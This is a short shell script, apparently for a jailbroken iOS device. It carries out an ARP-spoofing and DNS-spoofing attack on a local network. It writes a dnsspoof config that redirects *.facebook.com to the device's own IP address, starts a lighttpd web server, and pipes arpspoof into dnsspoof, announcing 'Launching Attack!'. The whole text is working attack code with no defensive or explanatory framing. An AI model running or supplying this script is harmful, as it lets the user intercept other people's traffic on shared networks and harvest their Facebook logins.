    iDeviceIP=`ifconfig en0 | grep "inet " | awk '/inet/ { print $2 }'`
    routerIP=`netstat -r | grep default | grep en0 | grep -oE '([[:digit:]]{1,3}\.){3}[[:digit:]]{1,3}'`
    fURL=*.facebook.com
    clear
    echo $iDeviceIP
    echo $routerIP
    echo $fURL
    sleep 2

    clear

    echo "[+] Writing etc/dnsspoof.conf"
    echo "$iDeviceIP""        ""$fURL" > /etc/dnsspoof.conf

    sleep 2

    echo "[>>>] Launching Attack!"

    echo "[>>>] Starting httpd server"
lighttpd -f /etc/lighttpd/lighttpd.conf
sleep 2
arpspoof $routerIP | dnsspoof -f /etc/dnsspoof.conf

